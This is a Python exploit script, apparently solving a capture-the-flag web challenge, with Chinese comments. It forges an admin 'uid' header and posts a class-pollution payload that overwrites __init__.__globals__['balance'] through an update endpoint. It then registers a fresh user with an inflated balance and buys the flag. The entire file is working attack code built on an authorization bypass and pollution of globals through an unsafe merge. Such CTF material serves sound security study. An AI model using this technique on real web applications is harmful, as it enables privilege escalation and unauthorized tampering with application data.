import requests
import random
import string

BASE_URL = "http://cloud-middle.hgame.vidar.club:31309"

def name_to_uid(name):
    """将用户名转换为UID：每个字母对应其在字母表中的位置"""
    return "".join(str(ord(c.lower()) - ord('a') + 1) for c in name if c.isalpha())

ADMIN_UID = name_to_uid("admin")  # "1413914"

session = requests.Session()

# 1. 注册并登录一个普通用户（用于获取token）
username = ''.join(random.choices(string.ascii_lowercase, k=8))
session.post(f"{BASE_URL}/register", json={"username": username, "password": "test"})
login_resp = session.post(f"{BASE_URL}/login", json={"username": username, "password": "test"}).json()
token = login_resp.get("token")

# 2. 使用admin UID进行原型链污染
# 通过修改 __init__.__globals__['balance'] 来改变新用户的初始余额
headers_admin = {"Authorization": f"Bearer {token}", "uid": ADMIN_UID, "Content-Type": "application/json"}
payload = {"__init__": {"__globals__": {"balance": 9999999}}}
session.post(f"{BASE_URL}/api/update", json=payload, headers=headers_admin)

# 3. 创建新用户（将继承被污染的balance值）
new_user = ''.join(random.choices(string.ascii_lowercase, k=8))
session.post(f"{BASE_URL}/register", json={"username": new_user, "password": "test"})
login2 = session.post(f"{BASE_URL}/login", json={"username": new_user, "password": "test"}).json()

headers = {
    "Authorization": f"Bearer {login2['token']}", 
    "uid": name_to_uid(new_user), 
    "Content-Type": "application/json"
}

# 4. 购买flag
resp = session.post(f"{BASE_URL}/api/buy", json={"item": "flag"}, headers=headers)
print(resp.json())
